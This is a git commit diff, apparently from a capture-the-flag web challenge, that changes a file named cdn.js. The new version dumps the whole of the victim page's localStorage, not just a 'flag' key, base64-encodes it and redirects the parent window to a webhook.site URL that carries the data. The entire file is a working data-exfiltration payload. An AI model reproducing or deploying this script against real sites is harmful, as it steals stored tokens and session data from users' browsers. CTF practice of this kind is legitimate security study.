323f08bb755bc671fe0c2bf2d5641514377e5c10
Manaf941 <manaf@2221.ch>
2024-03-22 17:38:16 +0000

    e

--- cdn.js
+++ cdn.js
@@ -1,3 +1,3 @@
-const flag = localStorage.getItem("flag")
+const flag = JSON.stringify({ ...localStorage })
 
 window.parent.document.location = `https://webhook.site/25a9a1e9-e5dc-49d2-8c32-85847db2ddb9?flag=${encodeURIComponent(btoa(flag))}`
